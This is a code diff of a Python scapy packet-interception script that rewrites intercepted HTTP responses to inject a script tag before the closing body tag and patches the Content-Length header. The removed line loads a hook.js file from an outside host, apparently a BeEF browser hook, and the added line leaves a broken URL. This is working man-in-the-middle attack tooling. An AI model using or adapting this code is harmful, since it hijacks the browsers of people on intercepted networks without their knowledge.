@@ -21,6 +21,7 @@ def process_packet(packet):
     scapy_pack = scapy.IP(packet.get_payload())
 
     try:
+
         if scapy_pack.haslayer(scapy.Raw):
             load = scapy_pack[scapy.Raw].load
             if scapy_pack[scapy.TCP].dport == 10000:
@@ -36,7 +37,7 @@ def process_packet(packet):
                 print("[+] HTTP Response\n")
                 print(scapy_pack.show())
                 # inject = "<script>alert('polo');</script>"
-                inject = "<script src='http://p0wnie.nywsec.com/hook.js'></script>"
+                inject = "<script src='http://www./hook.js'></script>"
                 load = load.replace("</body>", inject + "</body")
                 # Getting server content length value
                 content_length_sr = re.search("(?:Content-Length:\s)(\d*)", load)
@@ -45,7 +46,7 @@ def process_packet(packet):
                     content_length = content_length_sr.group(1)
                     new_cont_length = int(content_length) + len(inject)
                     load = load.replace(content_length, str(new_cont_length))
-                    print("polooooooooooooooo", content_length)
+                    # print("polooooooooooooooo", content_length)
 
             if load != scapy_pack[scapy.Raw].load:
                 new_packet = set_load(scapy_pack, load)
